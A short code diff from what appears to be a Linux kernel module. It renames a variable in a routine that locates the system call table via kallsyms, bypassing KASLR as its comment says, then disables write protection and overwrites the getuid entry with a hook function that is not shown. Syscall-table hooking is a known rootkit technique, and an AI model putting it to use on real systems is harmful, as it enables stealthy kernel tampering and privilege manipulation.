@@ -57,11 +57,11 @@ static void insert_hook(void)
 		Note: this overcomes the KASLR protection
 	*/
 	g_sys_call_table = (void **) kallsyms_lookup_name("sys_call_table");
-	g_original_func_ptr = (sys_call_func_ptr_t) sc_table_address[__NR_getuid];
+	g_original_func_ptr = (sys_call_func_ptr_t) g_sys_call_table[__NR_getuid];
 
 	/* Writing the hook */
 	turn_off_write_protect();
-	sc_table_address[__NR_getuid] = (void *)sc_getuid_hook;
+	g_sys_call_table[__NR_getuid] = (void *)sc_getuid_hook;
 	turn_on_write_protect();
 }
 
